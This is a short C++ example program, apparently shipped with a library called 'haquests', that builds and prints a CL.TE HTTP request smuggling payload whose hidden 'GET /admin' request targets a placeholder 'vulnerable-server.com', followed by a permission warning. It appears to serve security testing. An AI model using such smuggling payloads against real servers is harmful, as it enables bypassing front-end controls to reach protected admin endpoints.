#include "haquests/haquests.hpp"
#include <iostream>

using namespace haquests;

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <url>" << std::endl;
        return 1;
    }
    
    std::string url = argv[1];
    
    try {
        // Create CL.TE smuggling request
        std::string smuggled = "GET /admin HTTP/1.1\r\nHost: vulnerable-server.com\r\n\r\n";
        
        http::Request request = http::Smuggling::createCLTE(url, smuggled);
        
        std::cout << "CL.TE Smuggling Request:\n";
        std::cout << request.build() << std::endl;
        
        std::cout << "\nThis is a demonstration only." << std::endl;
        std::cout << "DO NOT use against systems you don't own or have permission to test!" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}
